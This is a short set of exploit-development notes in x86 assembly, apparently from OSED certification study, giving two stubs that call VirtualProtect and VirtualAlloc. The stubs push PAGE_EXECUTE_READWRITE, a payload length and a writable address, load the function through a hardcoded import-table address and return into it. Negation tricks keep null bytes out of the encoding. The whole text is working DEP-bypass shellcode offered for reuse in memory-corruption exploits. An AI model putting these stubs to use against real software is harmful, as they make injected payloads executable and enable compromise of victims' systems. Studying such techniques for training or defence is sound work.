example to call VirtualProtect

match:
    push 0x61f8c008 ; any writable address, https://github.com/p0wn4j/OSED_Mess/blob/main/DEP/VirtualProtect_WriteableMemory
    xor eax, eax
    mov al, 0x40
    push eax
    mov eax, 0xfffffbfc
    neg eax 
    push eax  ; 0x404 length of the payload
    push edi
    push edi
    mov ebx, 0x69aa7ea4      ; IAT of VirtualProtect
    mov eax, dword ptr [ebx]
    push eax
    ret


example to call VirtualAlloc

match:
    xor eax, eax
    mov al, 0x40        ; 0x40
    push eax
    mov eax, 0xffffefff ; -0x1001
    neg eax             ; 0x1001
    dec eax        
    push eax            ; 0x1000
    xor eax, eax
    inc eax             ; 0x1
    push eax
    push edi
    push edi
    mov edx, 0x10032078  ; VirtualAlloc IAT
    mov eax, dword ptr [edx]
    push eax
    ret
